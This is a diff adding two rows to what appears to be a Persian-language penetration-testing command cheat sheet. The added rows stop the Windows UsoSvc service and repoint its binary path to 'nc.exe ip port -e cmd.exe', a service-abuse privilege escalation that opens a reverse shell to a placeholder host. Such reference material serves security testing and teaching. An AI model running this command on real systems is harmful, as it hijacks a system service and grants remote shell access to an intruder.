@@ -426,6 +426,14 @@ published: true
       <td style="text-align:left">راه اندازی مجدد</td>
     </tr>
     <tr>
+      <td style="text-align:left">sc stop UsoSvc</td>
+      <td style="text-align:left">توقف سرویس</td>
+    </tr> 
+    <tr>
+      <td style="text-align:left">sc config UsoSvc binpath="c:\windows\temp\nc.exe ip port -e C:\windows\system32\cmd.exe"</td>
+      <td style="text-align:left">تغییر مسیر فایل اجرایی توسط UsoSvc</td>
+    </tr> 
+    <tr>
       <td style="text-align:left">tr -d &apos;\15\32&apos; win.txt unix.txt</td>
       <td style="text-align:left">حذف CR &amp; &apos;Z (&apos;nix)</td>
     </tr>
